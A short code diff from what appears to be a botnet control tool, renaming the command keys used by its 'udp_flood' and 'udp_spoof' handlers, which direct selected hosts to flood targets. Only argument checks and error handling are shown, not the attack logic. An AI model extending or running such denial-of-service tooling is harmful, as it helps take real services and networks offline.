@@ -14,7 +14,7 @@ def udp_flood(server, args):
     ret = [None, 0, ""]
     hosts = server.get_selected()
     if len(args) < 2:
-        ret[2] = ("Syntax : %s" % server.commands["UDP_Flood"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["udp_flood"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         try:
@@ -42,7 +42,7 @@ def udp_spoof(server, args):
     ret = [None, 0, ""]
     hosts = server.get_selected()
     if len(args) < 4:
-        ret[2] = ("Syntax : %s" % server.commands["UDP_Spoof"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["udp_spoof"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         try:
